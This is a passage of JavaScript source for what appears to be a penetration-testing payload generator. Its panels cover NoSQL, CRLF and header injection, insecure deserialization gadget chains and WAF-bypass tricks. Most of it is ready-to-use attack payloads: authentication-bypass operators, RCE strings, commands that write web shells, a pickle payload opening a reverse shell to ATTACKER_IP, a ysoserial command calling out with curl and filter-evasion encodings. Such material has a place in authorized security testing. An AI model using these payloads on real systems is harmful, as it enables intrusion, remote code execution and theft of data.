    { p: "username[$exists]=true&password[$exists]=true", note: "" },
    { p: '{"username": {"$gt": ""}, "password": {"$gt": ""}}', note: "" },
    { p: "admin'||'1'=='1", note: "String-context operator injection" },
    { p: "';return true;var x='", note: "$where JS injection" },
    { p: '{"$where": "this.username == this.password"}', note: "" },
    { p: '{"username": {"$regex": "^adm"}}', note: "Regex-based bypass/enum" },
  ] },
  { label: "MongoDB — blind boolean / data extraction", payloads: [
    { p: '{"username": "admin", "password": {"$regex": "^a"}}', note: "Password first char probe" },
    { p: '{"username": "admin", "password": {"$regex": "^b"}}', note: "" },
    { p: '{"username": "admin", "password": {"$regex": "^ad"}}', note: "" },
    { p: '{"$where": "sleep(5000)"}', note: "Blind time-based (JS $where)" },
    { p: '{"$where": "this.username == \'admin\' && sleep(5000)"}', note: "" },
    { p: 'username[$regex]=^admin&username[$options]=i', note: "Case-insensitive regex operator" },
    { p: '{"password": {"$regex": ".{5}"}}', note: "Length probing via regex quantifier" },
    { p: '{"$or": [{"a":"a"},{"1":"1"}]}', note: "" },
    { p: '{"username":{"$in":["admin","administrator","root"]}}', note: "Enumerate common usernames" },
    { p: "this.password.match(/^a/)", note: "Raw JS injected into $where" },
  ] },
  { label: "MongoDB — operator injection reference", payloads: [
    { p: "$ne", note: "not-equal operator, classic bypass primitive" },
    { p: "$gt", note: "greater-than, matches non-empty strings" },
    { p: "$gte", note: "" },
    { p: "$lt", note: "" },
    { p: "$regex", note: "regex match, useful for blind extraction" },
    { p: "$where", note: "arbitrary JS execution context" },
    { p: "$exists", note: "field-presence check" },
    { p: "$in", note: "value-in-list match" },
    { p: "$nin", note: "value-not-in-list match" },
    { p: "$or", note: "logical OR of sub-filters" },
    { p: "$and", note: "logical AND of sub-filters" },
    { p: "$expr", note: "aggregation-style expression injection (MongoDB 3.6+)" },
  ] },
  { label: "MongoDB — JavaScript execution", payloads: [
    { p: '{"$where": "function(){return true}"}', note: "" },
    { p: '{"$where": "function(){return this.a == this.a}"}', note: "" },
    { p: "'; return db.users.find(); var x='", note: "$where breakout to dump collection" },
    { p: '{"$where": "this.constructor.constructor(\'return process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\")\')()"}', note: "RCE via constructor escape (older MongoDB)" },
    { p: "'; while(true){}; var x='", note: "DoS via infinite loop in $where" },
  ] },
  { label: "CouchDB", payloads: [
    { p: "_all_docs?include_docs=true", note: "Dump all documents if API exposed" },
    { p: "/_utils/", note: "Fauxton admin panel default path" },
    { p: "/_config", note: "Exposed server config endpoint (pre-3.x)" },
    { p: '{"selector": {"_id": {"$gt": null}}}', note: "Mango query selector bypass" },
    { p: '{"selector": {"password": {"$gt": ""}}}', note: "" },
    { p: "/_membership", note: "Cluster membership info disclosure" },
    { p: "POST /_replicate {\"source\":\"http://ATTACKER_IP/db\",\"target\":\"victimdb\"}", note: "Replication SSRF pivot (CVE-2017-12635 class)" },
    { p: '{"docs": [{"_id": "_design/x", "views": {"y": {"map": "function(doc){require(\'child_process\').exec(\'id\')}"}}}]}', note: "Design-doc JS map-function RCE (legacy CouchDB)" },
  ] },
];

function renderNoSQLPanel(container) {
  genericPanel(container, {
    key: "nosql",
    title: "NoSQL Injection Payload Generator",
    desc: "MongoDB and CouchDB injection payloads: JSON/form operator injection for authentication bypass, $where JavaScript execution, blind regex-based data extraction, and CouchDB Mango-query / replication abuse.",
    encModes: ["none", "url", "base64", "unicodeEscape"],
    groups: NOSQL_GROUPS,
  });
}

/* ============================================================================================
 * CRLF Injection
 * ========================================================================================== */

const CRLF_GROUPS = [
  { label: "HTTP response splitting", payloads: [
    { p: "%0d%0aSet-Cookie:%20sessionid=hijacked", note: "Inject a Set-Cookie header" },
    { p: "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK", note: "Split into a second forged response" },
    { p: "%0d%0aX-Injected:%20true", note: "" },
    { p: "%0aSet-Cookie:%20sessionid=hijacked", note: "Bare LF variant (accepted by some servers)" },
    { p: "\\r\\nSet-Cookie: sessionid=hijacked", note: "Literal escape sequence form" },
    { p: "%0d%0a%0d%0a<script>alert(1)</script>", note: "Inject body content after header terminator, reflected XSS" },
    { p: "%E5%98%8A%E5%98%8DSet-Cookie:%20x=1", note: "Unicode CRLF (U+560A U+560D) bypass for some WAFs" },
    { p: "%0d%0aLocation:%20http://evil.com", note: "Header injection for open-redirect chaining" },
  ] },
  { label: "Log injection / log forging", payloads: [
    { p: "admin%0d%0a[INFO]%20User%20admin%20logged%20in%20successfully", note: "Forge a fake success log entry" },
    { p: "admin%0aFAKE LOG ENTRY - Unauthorized access from 10.0.0.1", note: "" },
    { p: "user123%0d%0a2024-01-01%2000:00:00%20ADMIN%20LOGIN%20SUCCESS", note: "" },
    { p: "%0d%0a[CRITICAL] System compromised - contact admin@evil.com", note: "" },
    { p: "test%0aX-Forwarded-For: 127.0.0.1", note: "Forge trusted header inside logs" },
    { p: "%0d%0a%0d%0a<?php system($_GET['cmd']); ?>", note: "Log poisoning for LFI-to-RCE chain" },
  ] },
  { label: "SMTP / email header injection", payloads: [
    { p: "test@example.com%0d%0aBcc:victim2@example.com", note: "Add hidden BCC recipient" },
    { p: "test@example.com%0ACc:spam-list@example.com", note: "" },
    { p: "test@example.com%0d%0aSubject:%20You%20won!", note: "Override subject line" },
    { p: "test@example.com%0d%0a%0d%0aFrom:%20ceo@company.com", note: "Inject forged From header + new body" },
    { p: "test@example.com%0d%0aTo:%20victim@example.com%0d%0aSubject:%20Phish", note: "" },
    { p: "test@example.com\\nBcc:everyone@company.com", note: "Bare LF variant" },
  ] },
  { label: "Cache poisoning / proxy confusion", payloads: [
    { p: "%0d%0aX-Cache-Poison:%20true%0d%0a%0d%0a<script>alert(document.domain)</script>", note: "Poison shared cache with injected body" },
    { p: "%0d%0aVary:%20X-Nonexistent-Header", note: "Force cache key confusion" },
    { p: "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>defaced</h1>", note: "" },
    { p: "%0d%0aTransfer-Encoding:%20chunked", note: "Request smuggling primitive" },
    { p: "%0d%0aContent-Length:%2013%0d%0a%0d%0aSMUGGLED", note: "" },
  ] },
  { label: "Raw / encoded variants", payloads: [
    { p: "\\u000d\\u000aSet-Cookie: x=1", note: "Unicode escape CRLF" },
    { p: "%250d%250a", note: "Double URL-encoded CRLF" },
    { p: "%0D%0A", note: "Uppercase hex CRLF" },
    { p: "%0d", note: "Bare CR" },
    { p: "%0a", note: "Bare LF" },
    { p: "\\r\\n\\r\\n", note: "Literal double CRLF header terminator" },
  ] },
];

function renderCrlfPanel(container) {
  genericPanel(container, {
    key: "crlf",
    title: "CRLF Injection Payload Generator",
    desc: "Carriage-return/line-feed injection payloads for HTTP response splitting, log forging, SMTP header injection, and cache-poisoning / request-smuggling primitives.",
    encModes: ["none", "url", "doubleUrl", "unicodeEscape"],
    groups: CRLF_GROUPS,
  });
}

/* ============================================================================================
 * Header Injection
 * ========================================================================================== */

const HEADER_GROUPS = [
  { label: "Host header attacks", payloads: [
    { p: "Host: evil.com", note: "Basic host header override for cache poisoning / password reset poisoning" },
    { p: "Host: victim.com:evil.com", note: "Port confusion" },
    { p: "Host: victim.com@evil.com", note: "Userinfo confusion" },
    { p: "Host: evil.com\\r\\nHost: victim.com", note: "Duplicate host header smuggling" },
    { p: "X-Forwarded-Host: evil.com", note: "Trusted-proxy header override" },
    { p: "X-Forwarded-Host: evil.com, victim.com", note: "Multi-value confusion" },
    { p: "X-Host: evil.com", note: "" },
    { p: "X-Original-Host: evil.com", note: "" },
  ] },
  { label: "IP spoofing / access-control bypass", payloads: [
    { p: "X-Forwarded-For: 127.0.0.1", note: "Spoof loopback to bypass IP allowlists" },
    { p: "X-Forwarded-For: 127.0.0.1, 8.8.8.8", note: "Chained forwarding list" },
    { p: "X-Real-IP: 127.0.0.1", note: "" },
    { p: "X-Client-IP: 127.0.0.1", note: "" },
    { p: "X-Remote-IP: 127.0.0.1", note: "" },
    { p: "X-Remote-Addr: 127.0.0.1", note: "" },
    { p: "X-Originating-IP: 127.0.0.1", note: "" },
    { p: "True-Client-IP: 127.0.0.1", note: "" },
    { p: "CF-Connecting-IP: 127.0.0.1", note: "Cloudflare-specific header spoof" },
    { p: "X-Forwarded-For: 0.0.0.0", note: "" },
    { p: "X-Forwarded-For: internal-admin-panel", note: "Hostname instead of IP, tests naive parsing" },
  ] },
  { label: "Authentication / authorization bypass", payloads: [
    { p: "X-Forwarded-User: admin", note: "Trusted-proxy identity override" },
    { p: "X-Remote-User: admin", note: "" },
    { p: "X-User: admin", note: "" },
    { p: "X-Admin: true", note: "" },
    { p: "X-Debug-Mode: true", note: "Enable hidden debug/verbose mode" },
    { p: "X-Api-Key: 00000000-0000-0000-0000-000000000000", note: "Guess/insert default API key header" },
    { p: "X-Original-URL: /admin", note: "Override routing to access restricted path" },
    { p: "X-Rewrite-URL: /admin", note: "" },
    { p: "X-Custom-IP-Authorization: 127.0.0.1", note: "" },
  ] },
  { label: "Content negotiation / smuggling primitives", payloads: [
    { p: "Transfer-Encoding: chunked\\r\\nContent-Length: 6", note: "TE.CL request smuggling setup" },
    { p: "Content-Length: 6\\r\\nTransfer-Encoding: chunked", note: "CL.TE request smuggling setup" },
    { p: "Transfer-Encoding: chunked\\r\\nTransfer-Encoding: x", note: "Duplicate/obfuscated TE header" },
    { p: "Transfer-Encoding:\\tchunked", note: "Tab-obfuscated TE header" },
    { p: "Content-Type: application/x-www-form-urlencoded\\r\\nX-Injected: 1", note: "" },
    { p: "Expect: 100-continue\\r\\nX-Injected: 1", note: "" },
  ] },
];

function renderHeaderPanel(container) {
  genericPanel(container, {
    key: "header-injection",
    title: "Header Injection Payload Generator",
    desc: "Raw HTTP request/response header payloads for Host-header attacks, IP-spoofing access-control bypass, trusted-header authentication bypass, and request-smuggling setup headers.",
    encModes: ["none", "url", "base64"],
    groups: HEADER_GROUPS,
  });
}

/* ============================================================================================
 * Insecure Deserialization — reference material (not a live generator; gadget chains require
 * matching library versions on the target, so these are documented starting points and the
 * tooling used to build working exploit chains).
 * ========================================================================================== */

const DESER_DATA = [
  {
    lang: "java",
    title: "Java",
    desc: "Java's native serialization (ObjectInputStream.readObject) walks the object graph and invokes readObject/readResolve/finalize on arbitrary classes present on the classpath. If a 'gadget chain' of classes exists that eventually reaches a dangerous sink (Runtime.exec, ProcessBuilder, reflection), an attacker-supplied serialized blob can achieve RCE without any application-specific vulnerability beyond deserializing untrusted input.",
    detection: [
      "Serialized data starts with the magic bytes AC ED 00 05 (hex) or rO0 in base64.",
      "HTTP parameters, cookies, or file uploads that look like opaque base64 blobs passed to frameworks known to deserialize (Java RMI, JMX, HTTP session state, message queues).",
      "Content-Type: application/x-java-serialized-object on API endpoints.",
      "Look for vulnerable libraries on the classpath: Commons-Collections, Commons-BeanUtils, Groovy, Spring, Rome, Hibernate, JBoss/Wildfly EJBInvokerServlet.",
    ],
    tools: ["ysoserial — generates gadget-chain payloads for dozens of libraries", "ysoserial.net — .NET equivalent", "GadgetProbe — blind classpath fingerprinting", "marshalsec — RMI/JNDI-focused gadget generator", "Java Deserialization Scanner (Burp extension)"],
    gadgetChains: [
      { name: "CommonsCollections1-11", desc: "Classic Apache Commons-Collections InvokerTransformer chain, many variants for different CC/JDK versions.", cmd: "java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER_IP/pwned' > payload.bin" },
      { name: "Spring1 / Spring2", desc: "Abuses Spring's AOP proxy classes to reach a Runtime.exec sink.", cmd: "java -jar ysoserial.jar Spring1 'id' > payload.bin" },
      { name: "Groovy1", desc: "Uses Groovy's MethodClosure to invoke arbitrary static methods.", cmd: "java -jar ysoserial.jar Groovy1 'id' > payload.bin" },
      { name: "ROME", desc: "Abuses the Rome RSS/Atom library's ObjectBean equals()/toString() to trigger a JNDI lookup or expression evaluation.", cmd: "java -jar ysoserial.jar ROME 'id' > payload.bin" },
      { name: "JRMPClient / JRMPListener", desc: "Turns an RMI-reachable deserialization point into a callback that connects to an attacker-controlled JRMP listener serving the real gadget chain.", cmd: "java -jar ysoserial.jar JRMPListener 1099 CommonsCollections6 'id'" },
    ],
    examplePayload: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvcnhwP0AAAAAAAAF3CAAAAAIAAAAAeA==",
  },
  {
    lang: "php",
    title: "PHP",
    desc: "PHP's unserialize() reconstructs objects from a serialized string and automatically calls magic methods such as __wakeup(), __destruct(), and __toString() on the resulting objects. A 'POP chain' (Property-Oriented Programming) links together classes already loaded by the application (framework classes count) so that these magic-method calls cascade into a dangerous operation like file_put_contents, call_user_func, or SQL execution.",
    detection: [
      "Serialized string begins with a type tag: O: (object), a: (array), s: (string), i: (integer), b: (boolean).",
      "Cookies or hidden form fields containing base64 that decode to PHP serialization syntax, e.g. O:4:\"User\":2:{...}.",
      "Application uses unserialize() directly on user input instead of json_decode(), or uses insecure phar:// stream wrapper handling on file paths (phar deserialization).",
      "Frameworks with known POP chains: Laravel, Symfony, WordPress, Drupal (via PHPGGC library names).",
    ],
    tools: ["PHPGGC — library of pre-built POP-chain gadgets for common PHP frameworks", "phpggc -l to list available gadget chains", "Manual analysis with a PHP object-injection-aware static analyzer"],
    gadgetChains: [
      { name: "Laravel/RCE9", desc: "Laravel Illuminate broadcasting/queue gadget chain leading to RCE.", cmd: "phpggc Laravel/RCE9 system id > payload.txt" },
      { name: "Monolog/RCE1", desc: "Abuses Monolog's log handler __destruct to write a webshell.", cmd: "phpggc Monolog/RCE1 /var/www/html/shell.php '<?php system($_GET[0]); ?>' > payload.txt" },
      { name: "Guzzle/FW1", desc: "File-write gadget via Guzzle's FnStream wrapper.", cmd: "phpggc Guzzle/FW1 /var/www/html/shell.php '<?php system($_GET[0]); ?>' > payload.txt" },
      { name: "phar:// deserialization", desc: "PHP automatically unserializes phar archive metadata whenever a phar:// stream is touched by a filesystem function (file_exists, is_dir, getimagesize) — even without calling unserialize() directly.", cmd: "php --define phar.readonly=0 generate_phar.php  # crafts a .phar disguised as an image" },
    ],
    examplePayload: 'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"isAdmin";b:1;}',
  },
  {
    lang: "python",
    title: "Python",
    desc: "Python's pickle module is explicitly documented as unsafe for untrusted input: the pickle bytecode format includes opcodes (REDUCE / GLOBAL) that let a crafted stream call any importable callable with attacker-chosen arguments, most directly os.system or subprocess.Popen. Related risks include yaml.load() (before safe_load became default), jsonpickle, and pandas.read_pickle().",
    detection: [
      "Pickle streams start with \\x80 (protocol marker) for binary protocols, or contain readable opcodes like c__builtin__\\nexec\\n for protocol 0.",
      "Cache files, session stores (e.g. some Flask-Session backends), or message queue payloads (Celery with pickle serializer) that are unpickled without validation.",
      "Any endpoint doing yaml.load(data) instead of yaml.safe_load(data).",
    ],
    tools: ["pickletools.dis() to disassemble and inspect an unknown pickle stream before trusting it", "PyYAML's own advisory / bandit static analysis rule B301/B506", "Manual __reduce__ crafting (no external tool needed — pure Python)"],
    gadgetChains: [
      { name: "__reduce__ os.system", desc: "The canonical minimal RCE pickle: a class whose __reduce__ returns (os.system, (cmd,)).", cmd: "python3 -c \"import pickle,os\\nclass E:\\n def __reduce__(self):\\n  return (os.system,('id',))\\nprint(pickle.dumps(E()))\"" },
      { name: "subprocess.Popen chain", desc: "Same technique targeting subprocess.Popen for interactive reverse shells.", cmd: "return (subprocess.Popen, (['/bin/sh','-c','bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'],))" },
      { name: "PyYAML !!python/object/apply", desc: "YAML tag that instructs the unsafe Loader to instantiate and call an arbitrary Python callable.", cmd: "!!python/object/apply:os.system [\"id\"]" },
    ],
    examplePayload: "(cos\nsystem\n(S'id'\ntR.",
  },
  {
    lang: "dotnet",
    title: ".NET",
    desc: ".NET has multiple serialization surfaces with historically unsafe defaults: BinaryFormatter, SoapFormatter, NetDataContractSerializer, LosFormatter (used by ASP.NET ViewState), ObjectStateFormatter, and JavaScriptSerializer with TypeNameHandling enabled in JSON.NET. Gadget chains (found by ysoserial.net) chain together classes that already exist in the GAC/runtime (e.g. TypeConfuseDelegate, WindowsIdentity, ActivitySurrogateSelector) to reach File.WriteAllText or process execution.",
    detection: [
      "ViewState (__VIEWSTATE) parameter on ASP.NET WebForms pages — if MachineKey validation is disabled or the key is known/leaked, this is directly forgeable.",
      "Base64 blobs beginning with AAEAAAD (BinaryFormatter header) after decoding.",
      "JSON.NET responses/requests containing \"$type\" fields — indicates TypeNameHandling is enabled.",
      "WCF/remoting endpoints accepting NetDataContractSerializer payloads.",
    ],
    tools: ["ysoserial.net — the .NET gadget-chain generator, supports BinaryFormatter/LosFormatter/Json.Net/ObjectStateFormatter/etc formatters", "ViewState decoder / Blacklist3r for MachineKey brute-forcing", "AspNetViewStateEditor Burp extension"],
    gadgetChains: [
      { name: "TypeConfuseDelegate", desc: "Generic gadget usable with BinaryFormatter, SoapFormatter, LosFormatter, and NetDataContractSerializer to reach a delegate invocation.", cmd: "ysoserial.exe -o base64 -g TypeConfuseDelegate -f BinaryFormatter -c \"calc.exe\"" },
      { name: "ActivitySurrogateSelector", desc: "Bypasses TypeFilterLevel restrictions on BinaryFormatter by compiling and running C# at deserialization time.", cmd: "ysoserial.exe -g ActivitySurrogateSelectorFromFile -f BinaryFormatter -o base64 -c \"payload.cs\"" },
      { name: "ObjectDataProvider (JSON.NET)", desc: "Abuses WPF's ObjectDataProvider via Json.NET's $type handling to invoke Process.Start.", cmd: "ysoserial.exe -g ObjectDataProvider -f Json.Net -o base64 -c \"cmd /c calc\"" },
      { name: "ViewState forgery", desc: "With a known/leaked validationKey and decryptionKey, forge a __VIEWSTATE that deserializes into a ysoserial.net LosFormatter gadget for full RCE on the IIS worker process.", cmd: "ysoserial.exe -p ViewState -g TypeConfuseDelegate --generator=\"...\" --validationalg=\"SHA1\" --validationkey=\"...\" -c \"whoami\"" },
    ],
    examplePayload: "AAEAAAD/////AQAAAAAAAAAMAgAAAFJTeXN0ZW0uLi4=",
  },
  {
    lang: "ruby",
    title: "Ruby",
    desc: "Ruby's Marshal.load reconstructs objects (including instantiating arbitrary classes and calling their _load / marshal_load / init_with methods) from a binary stream with no sandboxing. Rails additionally exposes this through cookie-based sessions (ActionDispatch::Session), Rails.cache, and YAML.load on untrusted input — the latter fixed by Psych's safe_load becoming default but still exploitable on older apps or explicit YAML.unsafe_load calls.",
    detection: [
      "Marshal streams start with the version header \\x04\\x08.",
      "Rails session cookies (typically base64, often ending in ==) that decode to a Marshal or YAML stream — check the session store config (CookieStore vs ActiveRecordStore).",
      "Look for a leaked secret_key_base — with it, session cookies can be forged wholesale.",
      "Universal gadget chains rely on gems commonly bundled with Rails: ActiveSupport, ActionView, Nokogiri, PSYCH.",
    ],
    tools: ["universal-rails-rce (a widely-shared Marshal gadget targeting ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy)", "ruby_dcom / metasploit rails_secret_deserialization module", "Manual Marshal.dump crafting in an irb console matching the target's gem versions"],
    gadgetChains: [
      { name: "Universal Rails gadget (ActiveSupport)", desc: "Chains ActiveSupport::Deprecation proxy classes through Gem::Requirement / Net::WriteAdapter to reach an arbitrary method call, historically used against CVE-2013-0156-class endpoints.", cmd: "ruby -e \"require 'active_support/all'; puts Marshal.dump(gadget_chain_object)\" > payload.bin" },
      { name: "Rails secret_key_base cookie forgery", desc: "If secret_key_base is known (default in many Rails scaffolds, or brute-forced from Blacklist3r-style wordlists), sign and forge an ActionDispatch cookie embedding a Marshal RCE gadget.", cmd: "rails_secret_deserialization metasploit module, or scripted with Rails' MessageVerifier" },
      { name: "YAML.unsafe_load / Psych gadget", desc: "!ruby/object tags instantiate arbitrary classes; combined with a gem that has a dangerous initialize or method_missing, this reaches command execution.", cmd: "--- !ruby/object:Gem::Requirement\\nrequirements:\\n  !ruby/object:Gem::Package::TarReader\\n    io: ..." },
    ],
    examplePayload: "\\x04\\x08o:\\x08User\\x07:\\x0f@usernameI\\\"\\x0Aadmin\\x06:\\x06ET",
  },
];

function renderDeserPanel(container) {
  let activeLang = "java";

  function paint() {
    const d = DESER_DATA.find((x) => x.lang === activeLang);
    container.innerHTML = `
      <div class="panel pg-panel-inner">
        <h2 class="pg-h2" style="margin-top:0">Deserialization Reference</h2>
        <p class="muted">Insecure deserialization is a gadget-chain problem, not a single reusable payload — a working exploit depends on the exact libraries and versions loaded by the target. This reference covers detection signatures, tooling, and known gadget chains per language so you can build a working chain with the right generator tool against your authorized target.</p>
        <div class="pg-sub-tabs" id="deser-tabs">
          ${DESER_DATA.map((x) => `<button data-l="${x.lang}" class="${x.lang === activeLang ? "active" : ""}">${esc(x.title)}</button>`).join("")}
        </div>
        <div class="pg-ref-card">
          <h3>${esc(d.title)}</h3>
          <p>${esc(d.desc)}</p>
          <h4 style="margin:14px 0 6px;font-size:.82rem;color:var(--txt)">Detection signatures</h4>
          <ul style="margin:0 0 10px;padding-left:20px;font-size:.82rem;color:var(--mut);line-height:1.6">${d.detection.map((x) => `<li>${esc(x)}</li>`).join("")}</ul>
          <h4 style="margin:14px 0 6px;font-size:.82rem;color:var(--txt)">Tooling</h4>
          <ul style="margin:0 0 10px;padding-left:20px;font-size:.82rem;color:var(--mut);line-height:1.6">${d.tools.map((x) => `<li>${esc(x)}</li>`).join("")}</ul>
          <h4 style="margin:14px 0 6px;font-size:.82rem;color:var(--txt)">Known gadget chains</h4>
          ${d.gadgetChains.map((g) => `
            <div style="margin-bottom:10px">
              <strong style="font-size:.84rem">${esc(g.name)}</strong>
              <div class="muted" style="font-size:.8rem;margin:2px 0 6px">${esc(g.desc)}</div>
              <pre>${esc(g.cmd)}</pre>
            </div>`).join("")}
          <h4 style="margin:14px 0 6px;font-size:.82rem;color:var(--txt)">Example serialized fragment</h4>
          <pre>${esc(d.examplePayload)}</pre>
        </div>
      </div>`;

    container.querySelectorAll("#deser-tabs button").forEach((b) => { b.onclick = () => { activeLang = b.dataset.l; paint(); }; });
  }

  paint();
}

/* ============================================================================================
 * WAF Bypass Techniques — reference library
 * ========================================================================================== */

const WAF_TECHNIQUES = [
  { cat: "Case & whitespace", title: "Mixed/random case keywords", desc: "Many signature-based WAFs match keywords case-sensitively or with an incomplete case-insensitive regex. Randomizing case (SeLeCT, sCrIpT) can slip past naive patterns.", example: "SeLeCT * FrOm users" },
  { cat: "Case & whitespace", title: "Tab instead of space", desc: "Replace literal spaces with tabs (%09) — many HTTP parsers and SQL engines treat tabs as valid whitespace but WAF regexes anchor on the space character.", example: "SELECT%09*%09FROM%09users" },
  { cat: "Case & whitespace", title: "Newline instead of space", desc: "Line feed (%0a) or carriage return (%0d) characters are valid whitespace in many contexts.", example: "SELECT%0a*%0aFROM%0ausers" },
  { cat: "Case & whitespace", title: "Multiple/redundant whitespace", desc: "Stack several whitespace variants together to defeat regexes expecting exactly one space character.", example: "SELECT%20%09%0a*FROM users" },
  { cat: "Case & whitespace", title: "Vertical tab / form feed", desc: "%0b (vertical tab) and %0c (form feed) are accepted as whitespace by some parsers and are less commonly blocklisted.", example: "UNION%0bSELECT%0c1,2" },
  { cat: "Case & whitespace", title: "No whitespace at all (parentheses)", desc: "In many SQL dialects, parentheses can substitute for whitespace around keywords, e.g. wrapping a subquery removes the need for a following space.", example: "SELECT(1)FROM(users)" },
  { cat: "Comment injection", title: "Inline comment as separator", desc: "SQL inline comments /**/ act as whitespace to the parser but break up literal keyword strings that a WAF regex is matching.", example: "UNION/**/SELECT/**/1,2" },
  { cat: "Comment injection", title: "MySQL versioned comments", desc: "/*!50000SELECT*/ executes on MySQL >= 5.0.0 but looks like a comment to naive filters, and can smuggle keywords past a blocklist.", example: "/*!UNION*/ /*!SELECT*/ 1,2" },
  { cat: "Comment injection", title: "Nested/nested comments", desc: "Some engines tolerate comment-in-comment constructs that confuse simple regex-based stripping logic.", example: "/*!/*/*/*!SELECT*/*/*/" },
  { cat: "Comment injection", title: "HTML comment breakup (XSS)", desc: "Splitting a tag name with an HTML comment can defeat filters that look for a contiguous 'script' string while some legacy parsers still ignore the comment.", example: "<sc<!---->ript>alert(1)</script>" },
  { cat: "Comment injection", title: "CSS comment breakup", desc: "CSS comments /* */ can be inserted mid-property to break signature matches while the browser still parses the rule.", example: "exp/**/ression(alert(1))" },
  { cat: "Encoding", title: "Single URL encoding", desc: "The most basic bypass — encode special characters so a WAF matching raw characters (', <, /) misses them, relying on the app to decode before use.", example: "%27%20OR%20%271%27%3D%271" },
  { cat: "Encoding", title: "Double URL encoding", desc: "Encode the percent sign itself (%25) so that after the WAF's single decode pass, the payload still looks benign, but the application's second decode pass reveals it.", example: "%2527%20OR%20%25271%2527%3D%25271" },
  { cat: "Encoding", title: "Overlong UTF-8 encoding", desc: "Represent an ASCII character using a non-minimal multi-byte UTF-8 sequence (e.g. %c0%af for /). Technically invalid UTF-8, but some parsers (older IIS/Tomcat) decode it anyway.", example: "..%c0%af..%c0%afetc%c0%afpasswd" },
  { cat: "Encoding", title: "UTF-7 encoding (legacy IE)", desc: "In contexts where the response is interpreted as UTF-7 (old IE with no explicit charset), +ADw- decodes to < allowing XSS through filters expecting UTF-8/ASCII.", example: "+ADw-script+AD4-alert(1)+ADw-/script+AD4-" },
  { cat: "Encoding", title: "HTML entity encoding (decimal)", desc: "Encode characters as &#NN; decimal HTML entities — browsers decode these in HTML/attribute contexts even though a WAF signature is looking for the literal character.", example: "&#60;script&#62;alert(1)&#60;/script&#62;" },
  { cat: "Encoding", title: "HTML entity encoding (hex, no semicolon)", desc: "Many browsers accept HTML hex entities without the trailing semicolon, which some entity-decoding WAF normalizers miss.", example: "&#x3C;img src=x onerror=alert(1)&#x3E" },
  { cat: "Encoding", title: "Unicode escape sequences", desc: "\\uNNNN inside a JavaScript string literal is decoded by the JS engine at runtime, after the WAF has already inspected (and passed) the raw text.", example: "\\u0061lert(1)" },
  { cat: "Encoding", title: "Base64 wrapping (data: URI)", desc: "Wrap a full payload in a data: URI with base64 content — many WAFs don't recursively decode and re-inspect data: URI bodies.", example: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" },
  { cat: "Encoding", title: "Hex-encoded SQL string literals", desc: "MySQL/MSSQL accept 0x-prefixed hex literals as strings, avoiding quote characters entirely — bypasses filters that block single/double quotes.", example: "SELECT 0x61646d696e" },
  { cat: "Encoding", title: "CHAR()/CONCAT() string building", desc: "Build the sensitive keyword or string at query-execution time from character codes, so the literal keyword never appears in the request.", example: "SELECT CHAR(83,69,76,69,67,84)" },
  { cat: "Null byte / termination", title: "Null byte suffix", desc: "Legacy C-based string handling (older PHP, some file-system APIs) truncates a string at a null byte, letting an attacker append a null byte to bypass extension checks.", example: "shell.php%00.jpg" },
  { cat: "Null byte / termination", title: "Null byte inside a tag", desc: "Some regex-based HTML filters fail to match across an embedded null byte while the renderer still parses the tag normally.", example: "<scri%00pt>alert(1)</script>" },
  { cat: "Null byte / termination", title: "Percent-encoded null mid-keyword", desc: "%00 inserted directly inside a blocked keyword can defeat naive substring blocklists in some interpreters.", example: "UN%00ION SEL%00ECT 1,2" },
  { cat: "Tag / syntax alternatives", title: "Alternative XSS tags", desc: "If <script> is blocklisted, dozens of other tags support script-equivalent event handlers: svg, img, body, iframe, details, marquee, video.", example: "<svg onload=alert(1)>" },
  { cat: "Tag / syntax alternatives", title: "Self-closing / malformed tags", desc: "Browsers tolerate malformed HTML far more than regex-based filters expect, e.g. missing closing angle brackets or duplicated tag starts.", example: "<img src=x onerror=alert(1)//>" },
  { cat: "Tag / syntax alternatives", title: "Backtick function calls", desc: "ES6 tagged template literals let you call a single-argument function without parentheses, bypassing filters that block '('.", example: "alert`1`" },
  { cat: "Tag / syntax alternatives", title: "Attribute-based event handlers without quotes", desc: "HTML attributes don't require quotes if they contain no whitespace, letting you skip both single and double quote characters entirely.", example: "<img src=x onerror=alert(1)>" },
  { cat: "Tag / syntax alternatives", title: "Alternate comment terminators", desc: "MySQL comment styles (--, --SPACE, #) behave slightly differently across parsers; trying all three defeats filters tuned to only one.", example: "' OR 1=1#" },
  { cat: "Tag / syntax alternatives", title: "Stacked/chained separators (command injection)", desc: "If one separator (;) is blocked, try &&, ||, |, backticks, $(), or newline — WAFs commonly blocklist only the most famous separator.", example: "| id" },
  { cat: "Protocol / transport", title: "HTTP parameter pollution", desc: "Supplying the same parameter name twice can cause the WAF and the backend application to read different values (first vs last occurrence), letting the malicious value slip through unseen by the WAF.", example: "id=1&id=1' OR '1'='1" },
  { cat: "Protocol / transport", title: "Chunked transfer encoding", desc: "Splitting the malicious payload across multiple chunks can prevent a WAF that inspects only the initial buffered portion of the body from seeing the full payload.", example: "Transfer-Encoding: chunked with payload split across chunk boundaries" },
  { cat: "Protocol / transport", title: "Content-Type confusion", desc: "Sending a JSON payload with Content-Type: text/plain, or vice versa, can cause the WAF's content-type-specific parser to skip inspection entirely while the backend still parses it as JSON.", example: "Content-Type: text/plain\\n{\"cmd\":\"; id\"}" },
  { cat: "Protocol / transport", title: "Multipart form field abuse", desc: "Some WAFs don't fully parse multipart/form-data boundaries and miss payloads placed in later parts or unusual field names.", example: "------WebKitBoundary\\nContent-Disposition: form-data; name=\"file\"; filename=\"x.php\"" },
  { cat: "Protocol / transport", title: "HTTP request smuggling (CL.TE / TE.CL)", desc: "Disagreement between front-end proxy/WAF and back-end server on how to interpret Content-Length vs Transfer-Encoding lets an attacker smuggle a second hidden request past the WAF's inspection.", example: "Content-Length: 6\\r\\nTransfer-Encoding: chunked" },
  { cat: "Protocol / transport", title: "Verb tampering", desc: "Some WAF rule sets only apply to specific HTTP methods (commonly GET/POST); switching to PUT, PATCH, or a custom method can bypass method-specific rules.", example: "PUT /api/user HTTP/1.1" },
